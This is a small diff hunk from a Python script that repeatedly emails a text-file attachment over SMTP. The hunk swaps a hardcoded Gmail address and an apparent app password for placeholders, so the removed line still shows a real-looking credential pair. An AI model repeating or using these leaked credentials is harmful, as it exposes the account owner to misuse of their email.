@@ -94,7 +94,7 @@ while True:
         message.add_attachment(text_file, maintype='text', subtype='txt', filename=f.name)
 
         smtp = smtplib.SMTP_SSL(SMTP_SERVER, SMTP_PORT)
-        smtp.login("tnwlssla20@gmail.com", "aeaggowisdevimcx")
+        smtp.login("id", "ps")
         sendEmail(mail)
         smtp.quit()
 
